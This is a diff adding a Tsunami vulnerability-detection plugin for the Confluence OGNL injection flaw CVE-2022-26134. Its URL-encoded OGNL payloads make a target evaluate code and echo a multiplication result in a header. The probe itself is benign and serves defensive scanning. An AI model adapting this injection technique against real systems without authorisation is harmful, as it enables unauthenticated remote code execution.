@@ -1,0 +1,82 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ConfluenceOgnlInjectionRceDetector"
+  author: "Tsunami Team (tsunami-dev@google.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2022_26134"
+  }
+  severity: CRITICAL
+  title: "Atlassian Confluence RCE CVE-2022-26134"
+  description: "An unauthenticated and remote OGNL injection vulnerability results in remote code execution in the Atlassian Confluence. Please read the remediation guidance section below for how to mitigate."
+  recommendation: "This is a critical vulnerability requiring immediate action. If your service is vulnerable, you should update it to patch the vulnerability. **Please check https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html for detailed patch information.**"
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2022-26134"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+# Probes both the root path and /longrunningtask.action (an administrator-gated
+# default-package WebWork action that triggers PermissionCheckInterceptor ->
+# "notpermitted" ActionChainResult even when anonymous wiki read access is
+# enabled), across both "/" and "/confluence" context roots. Evaluates pure
+# in-JVM OGNL integer multiplication via ServletActionContext.getResponse()
+# without spawning OS processes or depending on external callback egress.
+actions: {
+  name: "probe_ognl_namespace_evaluation"
+  http_request: {
+    method: GET
+    uri: [
+      "/%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22{{ CHECK_HEADER }}%22%2C%22tsunami%22%2B%28{{ FACTOR_A }}*{{ FACTOR_B }}%29%29%7D/",
+      "/%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22{{ CHECK_HEADER }}%22%2C%22tsunami%22%2B%28{{ FACTOR_A }}*{{ FACTOR_B }}%29%29%7D/longrunningtask.action",
+      "/confluence/%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22{{ CHECK_HEADER }}%22%2C%22tsunami%22%2B%28{{ FACTOR_A }}*{{ FACTOR_B }}%29%29%7D/",
+      "/confluence/%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22{{ CHECK_HEADER }}%22%2C%22tsunami%22%2B%28{{ FACTOR_A }}*{{ FACTOR_B }}%29%29%7D/longrunningtask.action"
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      expect_all: {
+        conditions: [
+          {
+            header: { name: "{{ CHECK_HEADER }}" }
+            contains: "tsunami{{ EXPECTED_PRODUCT }}"
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "CHECK_HEADER" value: "X-Confluence-Check" },
+    { name: "FACTOR_A" value: "41827" },
+    { name: "FACTOR_B" value: "39163" },
+    { name: "EXPECTED_PRODUCT" value: "1638070801" }
+  ]
+  actions: [
+    "probe_ognl_namespace_evaluation"
+  ]
+}
